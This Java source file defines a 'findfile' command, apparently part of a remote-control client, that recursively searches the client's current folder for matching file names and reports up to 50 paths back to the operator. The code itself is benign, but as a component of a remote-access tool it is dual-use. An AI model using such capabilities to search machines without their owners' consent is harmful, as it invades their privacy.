package br.com.introcdc.connect.client.commands.file.navigation;
/*
 * Written by IntroCDC, Bruno Coêlho at 11/09/2026 - 19:22
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientFileComponents;

import java.io.File;

public class ClientCommandFindFile extends ClientCommand {

    public ClientCommandFindFile() {
        super("findfile", "find");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input == null || input.trim().isEmpty()) {
            msg("Uso correto: findfile <nome do arquivo>");
            return;
        }

        File folder = new File(ClientFileComponents.FOLDER);
        if (!folder.exists() || !folder.isDirectory()) {
            msg("> Pasta atual inválida!");
            return;
        }

        msg("Procurando por '" + input + "' recursivamente a partir de: " + folder.getAbsolutePath() + "...");

        StringBuilder results = new StringBuilder();
        int[] count = new int[]{0};

        searchRecursive(folder, input.toLowerCase(), results, count);

        if (count[0] == 0) {
            msg("Nenhum arquivo ou pasta contendo '" + input + "' foi encontrado.");
        } else {
            if (count[0] >= 50) {
                results.append("... (limite de 50 resultados atingido)");
            }
            msg("Encontrado " + count[0] + " item(ns):\n" + results.toString().trim());
        }
    }

    private void searchRecursive(File currentDir, String target, StringBuilder results, int[] count) {
        File[] files = currentDir.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (file.getName().toLowerCase().contains(target)) {
                results.append("[").append(file.isDirectory() ? "D" : "A").append("] ")
                        .append(file.getAbsolutePath()).append("\n");
                count[0]++;

                if (count[0] >= 50) {
                    return;
                }
            }
            if (file.isDirectory() && count[0] < 50) {
                searchRecursive(file, target, results, count);
            }
        }
    }

}
